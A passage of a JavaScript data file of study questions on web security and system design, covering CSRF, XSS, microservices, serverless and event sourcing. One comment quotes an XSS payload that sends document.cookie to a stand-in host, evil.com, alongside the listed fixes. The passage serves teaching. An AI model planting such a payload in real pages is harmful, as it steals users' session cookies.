+// Access-Control-Allow-Origin: http://localhost:3000
+
+// 2. CSRF Attack:
+// You are logged into Bank.com.
+// You visit Evil.com. Evil.com contains a hidden form that auto-submits a POST request to Bank.com/transfer?amount=1000.
+// Because you are logged in, your browser attaches the Bank.com auth cookies automatically!
+// Fix: Require a hidden CSRF token generated by the server that Evil.com cannot guess.
+
+// 3. XSS Attack:
+// Attacker submits a comment: "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>"
+// Unprotected React/HTML renders it. Every user viewing the comment has their cookies stolen.
+// Fix: Never dangerously set innerHTML. Sanitize all markdown/text inputs. Use 'HttpOnly' flag on auth cookies (preventing JS access).`
+    },
+    {
+        id: "sys-16",
+        category: "System Design",
+        question: "Architecture Patterns: Monolith vs Microservices.",
+        answer: "A Monolith deploys the entire application (UI, Business Logic, DB logic) as a single tightly-coupled codebase. Microservices break the application into small, independent, loosely coupled services communicating via networks (HTTP/gRPC), allowing independent scaling, diverse tech stacks, and team autonomy at the cost of network complexity and data consistency challenges.",
+        snippet: `// --- The Monolith ---
+// [ Web Server ] -> Contains: (Users + Orders + Inventory + Payments)
+// Pros: Easy to debug, easy to deploy, fast internal function calls.
+// Cons: Changing 1 line of 'Payments' code requires redeploying the entire app.
+//       If 'Inventory' crashes due to memory leak, the whole app dies.
+
+// --- Microservices Architecture ---
+// [ Auth Service (Node) ]    -> [ MongoDB ]
+// [ Order Service (Java) ]   -> [ Postgres ]
+// [ Search Service (Go) ]    -> [ ElasticSearch ]
+// Pros: Independent scaling (Scale ONLY Orders during Black Friday).
+// Cons: Complex distributed transactions (Sagas), network latency, tracing.`
+    },
+    {
+        id: "sys-17",
+        category: "System Design",
+        question: "Explain Serverless Architecture and Service Mesh.",
+        answer: "Serverless (AWS Lambda) abstracts server provisioning away; code runs in ephemeral containers triggered by events, billing only for exact execution milliseconds. A Service Mesh (Istio/Linkerd) is an infrastructure layer for Microservices that handles service-to-service communication, sidecar proxies, load balancing, mutual TLS encryption, and observability without altering application code.",
+        snippet: `// --- Serverless Execution Flow ---
+// User Uploads Image -> S3 Bucket Event Trigger -> [ AWS Lambda Starts ]
+// -> Lambda Resizes Image -> Saves to DB -> [ Lambda Dies, Billing Stops ]
+// * Pros: Infinite auto-scaling, no idle server costs.
+// * Cons: "Cold Starts" (delay when spinning up a dormant container), Vendor Lock-in.
+
+// --- Service Mesh (Sidecar Pattern) ---
+// Instead of Service A managing retries/certs/metrics to talk to Service B:
+// [ Service A ] <-> (Sidecar Proxy) =====NETWORK===== (Sidecar Proxy) <-> [ Service B ]
+// The sidecars handle all the complex networking logic transparently.`
+    },
+    {
+        id: "sys-18",
+        category: "System Design",
+        question: "What are Event Sourcing and CQRS (Command Query Responsibility Segregation)?",
+        answer: "Event Sourcing stores the state of a system as a strict sequence of immutable state-changing events rather than just saving the current state (like a bank ledger). CQRS splits the application into two completely separate models/databases: one strictly for handling Commands (Writes/Updates) and one specifically optimized for handling Queries (Reads). Often used together.",
+        snippet: `// --- Event Sourcing Example (Bank Account) ---
+// ❌ Traditional DB: { id: 1, balance: 50 }  (Lose history of HOW we got 50)
+// 
+// ✅ Event Source Ledger:
+// Event 1: { type: 'ACCOUNT_OPENED', balance: 0 }
+// Event 2: { type: 'DEPOSITED', amount: 100 }
+// Event 3: { type: 'WITHDREW', amount: 50 }
+// Total State (Rehydrated by replaying events): 50.
+
+// --- CQRS Architecture ---
+//                     /-> [ Command Handler ] -> writes -> [ Write DB (Highly Normalized SQL) ] 
+// [ Client Request ] -                | (async event trigger)
+//                     \\-> [ Query Handler ]   <- reads  <- [ Read DB (Denormalized NoSQL/Elastic) ]
+// * Ideal for heavy read-intensive systems where reads vastly outnumber writes.`
     }
 ];
